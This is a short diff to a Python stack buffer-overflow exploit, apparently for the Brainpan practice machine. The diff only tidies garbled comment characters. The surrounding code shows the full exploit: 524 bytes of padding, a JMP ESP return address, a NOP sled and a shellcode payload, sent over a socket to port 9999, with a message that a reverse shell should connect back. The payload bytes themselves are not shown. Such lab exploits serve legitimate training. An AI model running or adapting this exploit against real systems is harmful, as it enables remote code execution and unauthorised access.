@@ -222,7 +222,7 @@ payload = (
 padding = b"A" * 524
 
 # This 4-byte JMP ESP (little-endian) from mona. Change if yours differs.
-eip = b"\xF3\x12\x17\x31" # JMP ESP â†’ 0x311712f3
+eip = b"\xF3\x12\x17\x31" # JMP ESP 0x311712f3
 
 # NOP sled to give the shellcode some landing space
 nop_sled = b"\x90" * 32
@@ -230,7 +230,7 @@ nop_sled = b"\x90" * 32
 buffer = padding + eip + nop_sled + payload
 
 # 3. SET UP TARGET CONNECTION 
-host = "10.10.87.171" # â† change to your Brainpan IP if different
+host = "10.10.87.171" # change to your Brainpan IP if different
 port = 9999
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -248,8 +248,8 @@ except:
  pass
 
 # 4. SEND THE EXPLOIT (PASSWORD) 
-#
-# Brainpan expects a password line, so append "\r\n" so it's treated as input.
+
+# Brainpan expects a password line, so append "\r\n" so it's treated as input.
 s.send(buffer + b"\r\n")
 print("[+] Exploit buffer sent! The reverse shell should connect back on its own.")
 
